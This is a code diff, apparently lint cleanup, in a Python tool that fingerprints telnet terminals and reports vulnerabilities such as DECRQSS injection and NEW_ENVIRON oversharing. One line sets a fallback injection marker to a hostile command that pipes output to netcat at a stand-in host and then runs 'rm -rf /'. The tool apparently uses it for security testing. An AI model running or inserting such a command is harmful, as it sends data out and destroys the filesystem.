@@ -28,7 +28,6 @@ if TYPE_CHECKING:
 
 # third-party (optional)
 try:
-    from tv_detect.attacks import ATTACKS as _TV_ATTACKS
     from tv_detect.attacks import SEVERITY_COLOR
     from tv_detect.attacks import DECRQSS_INJECT_MARKER as _DECRQSS_INJECT_MARKER
     from tv_detect.execute import prompt_keys as _tv_prompt_keys
@@ -636,7 +635,8 @@ def _build_vulnerabilities_rows(
         low.append(
             (
                 cve_refs if not critical else "",
-                f"{_low('[LOW]')} {_low('Oversharing: ' + ', '.join(overshared) + ' (NEW_ENVIRON)')}",
+                f"{_low('[LOW]')} "
+                f"{_low('Oversharing: ' + ', '.join(overshared) + ' (NEW_ENVIRON)')}",
             )
         )
 
@@ -1143,7 +1143,7 @@ def _read_line(term: "blessed.Terminal") -> str:
 
 
 if not _HAS_TV_DETECT:
-    _DECRQSS_INJECT_MARKER = "id | nc example.com 919;rm -rf /"
+    _DECRQSS_INJECT_MARKER = "id | nc example.com 919;rm -rf /"  # noqa: F811
 
 
 def _paginate(term: "blessed.Terminal", text: str, **_kw: Any) -> None:
@@ -1315,7 +1315,7 @@ def _vuln_menu(term: "blessed.Terminal", software_name: str = "") -> Optional[st
         target = attack.get("target", "")
         target_str = f" ({target})" if target else ""
         echo(f"  ({term.bold(key)}) {sev_str} {attack['name']}{target_str}\r\n")
-    echo(f"\r\n: ")
+    echo("\r\n: ")
     key = _read_line(term).strip()
     if key in available:
         return key
@@ -1515,7 +1515,7 @@ def _fingerprint_repl(
         cmd = _read_line(term).strip().lower()
 
         if not cmd:
-            echo(f"\r: ")
+            echo("\r: ")
             continue
 
         if cmd in _commands:
@@ -1527,7 +1527,8 @@ def _fingerprint_repl(
             logger.info("%s: repl logoff", ip)
             echo(f"\n{term.normal}")
             break
-        elif cmd == "t":
+
+        if cmd == "t":
             _show_detail(term, data, "terminal")
         elif cmd == "l":
             _show_detail(term, data, "telnet")
